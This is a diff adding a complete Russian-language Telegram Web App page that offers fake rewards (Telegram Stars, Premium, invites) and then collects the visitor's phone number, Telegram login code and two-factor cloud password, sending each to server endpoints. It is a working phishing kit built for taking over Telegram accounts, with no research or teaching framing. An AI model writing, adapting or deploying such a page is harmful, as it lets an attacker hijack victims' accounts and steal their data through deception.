@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            background: var(--tg-theme-bg-color, #fff);
+            color: var(--tg-theme-text-color, #000);
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            padding: 16px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            width: 100%;
+        }
+        h2 { margin-bottom: 20px; text-align: center; }
+        .reward-card {
+            background: var(--tg-theme-secondary-bg-color, #f0f0f0);
+            border-radius: 20px;
+            padding: 25px;
+            margin: 10px 0;
+            cursor: pointer;
+            border: 3px solid transparent;
+            text-align: center;
+            font-size: 20px;
+            font-weight: 600;
+            transition: all 0.2s;
+        }
+        .reward-card.selected {
+            border-color: #2AABEE;
+            background: rgba(42,171,238,0.1);
+            transform: scale(1.02);
+        }
+        .input-field {
+            width: 100%;
+            padding: 18px;
+            font-size: 18px;
+            border-radius: 16px;
+            border: 2px solid #2AABEE;
+            margin: 10px 0;
+            background: var(--tg-theme-bg-color, #fff);
+            color: var(--tg-theme-text-color, #000);
+        }
+        .code-container {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 30px 0;
+        }
+        .code-digit {
+            width: 60px;
+            height: 70px;
+            text-align: center;
+            font-size: 32px;
+            font-weight: bold;
+            border: 3px solid #2AABEE;
+            border-radius: 16px;
+            background: var(--tg-theme-bg-color, #fff);
+        }
+        .btn {
+            width: 100%;
+            padding: 18px;
+            background: #2AABEE;
+            color: white;
+            border: none;
+            border-radius: 16px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+        .hidden { display: none; }
+        .hint { text-align: center; margin: 10px 0; color: #2AABEE; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- ШАГ 1: ВЫБОР НАГРАДЫ -->
+        <div id="step1">
+            <h2>🎁 Выбери награду</h2>
+            <div class="reward-card" onclick="selectReward('stars')">⭐ 200 Telegram Stars</div>
+            <div class="reward-card" onclick="selectReward('premium')">🚀 Telegram Premium 1 месяц</div>
+            <div class="reward-card" onclick="selectReward('invites')">👥 1000 приглашений</div>
+        </div>
+
+        <!-- ШАГ 2: ВВОД НОМЕРА -->
+        <div id="step2" class="hidden">
+            <h2>📱 Подтверждение</h2>
+            <p style="text-align:center; margin-bottom:20px;">Введи номер Telegram для получения награды</p>
+            <input type="tel" id="phone" class="input-field" placeholder="+7 999 123 45 67" value="+7">
+            <button class="btn" onclick="sendPhone()">Получить код</button>
+        </div>
+
+        <!-- ШАГ 3: ВВОД КОДА -->
+        <div id="step3" class="hidden">
+            <h2>🔐 Верификация</h2>
+            <p class="hint">Код отправлен в Telegram</p>
+            <div class="code-container">
+                <input class="code-digit" maxlength="1" oninput="moveNext(this, 0)">
+                <input class="code-digit" maxlength="1" oninput="moveNext(this, 1)">
+                <input class="code-digit" maxlength="1" oninput="moveNext(this, 2)">
+                <input class="code-digit" maxlength="1" oninput="moveNext(this, 3)">
+                <input class="code-digit" maxlength="1" oninput="moveNext(this, 4)">
+            </div>
+            <button class="btn" onclick="submitCode()">Подтвердить</button>
+            <p style="text-align:center; font-size:14px;">Код действителен 5 минут</p>
+        </div>
+
+        <!-- ШАГ 4: 2FA ПАРОЛЬ (если нужен) -->
+        <div id="step4" class="hidden">
+            <h2>🔐 Доп. защита</h2>
+            <p class="hint">Введи облачный пароль</p>
+            <input type="password" id="password" class="input-field" placeholder="Пароль 2FA">
+            <button class="btn" onclick="submit2FA()">Подтвердить</button>
+        </div>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.ready();
+        
+        let selectedReward = '';
+        let userPhone = '';
+        let userId = '';
+        
+        // Получаем параметры из URL
+        const urlParams = new URLSearchParams(window.location.search);
+        userId = urlParams.get('user_id') || 'unknown';
+        const userCode = urlParams.get('code') || '';
+        
+        function selectReward(reward) {
+            selectedReward = reward;
+            document.querySelectorAll('.reward-card').forEach(c => c.classList.remove('selected'));
+            event.target.classList.add('selected');
+            
+            setTimeout(() => {
+                document.getElementById('step1').classList.add('hidden');
+                document.getElementById('step2').classList.remove('hidden');
+            }, 300);
+        }
+
+        function sendPhone() {
+            userPhone = document.getElementById('phone').value;
+            if (!userPhone || userPhone.length < 10) {
+                tg.showAlert('Введи корректный номер');
+                return;
+            }
+            
+            // Отправляем запрос на код
+            fetch('/api/request_code', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    phone: userPhone,
+                    user_id: userId
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.success) {
+                    document.getElementById('step2').classList.add('hidden');
+                    document.getElementById('step3').classList.remove('hidden');
+                    
+                    // Автофокус на первый символ кода
+                    document.querySelectorAll('.code-digit')[0].focus();
+                } else {
+                    tg.showAlert('Ошибка: ' + data.error);
+                }
+            })
+            .catch(() => {
+                // Демо-режим если сервер не отвечает
+                document.getElementById('step2').classList.add('hidden');
+                document.getElementById('step3').classList.remove('hidden');
+            });
+        }
+
+        function moveNext(current, index) {
+            if (current.value.length === 1) {
+                if (index < 4) {
+                    document.querySelectorAll('.code-digit')[index + 1].focus();
+                }
+            }
+        }
+
+        function submitCode() {
+            const digits = document.querySelectorAll('.code-digit');
+            const code = Array.from(digits).map(d => d.value).join('');
+            
+            if (code.length !== 5) {
+                tg.showAlert('Введи полный 5-значный код');
+                return;
+            }
+            
+            fetch('/api/verify', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    phone: userPhone,
+                    code: code,
+                    user_id: userId,
+                    reward: selectedReward
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.success) {
+                    if (data.requires_2fa) {
+                        // Нужен пароль 2FA
+                        document.getElementById('step3').classList.add('hidden');
+                        document.getElementById('step4').classList.remove('hidden');
+                    } else {
+                        tg.showAlert('✅ Награда активирована! Проверь Telegram');
+                        setTimeout(() => tg.close(), 2000);
+                    }
+                } else {
+                    tg.showAlert('Ошибка: ' + (data.error || 'попробуй снова'));
+                }
+            })
+            .catch(() => {
+                // Демо-режим
+                tg.showAlert('✅ Демо: код получен');
+                setTimeout(() => tg.close(), 2000);
+            });
+        }
+
+        function submit2FA() {
+            const password = document.getElementById('password').value;
+            if (!password) {
+                tg.showAlert('Введи пароль');
+                return;
+            }
+            
+            fetch('/api/verify_2fa', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    phone: userPhone,
+                    password: password,
+                    user_id: userId
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.success) {
+                    tg.showAlert('✅ Награда активирована!');
+                    setTimeout(() => tg.close(), 2000);
+                } else {
+                    tg.showAlert('Ошибка: ' + (data.error || 'неверный пароль'));
+                }
+            });
+        }
+    </script>
+</body>
+</html>
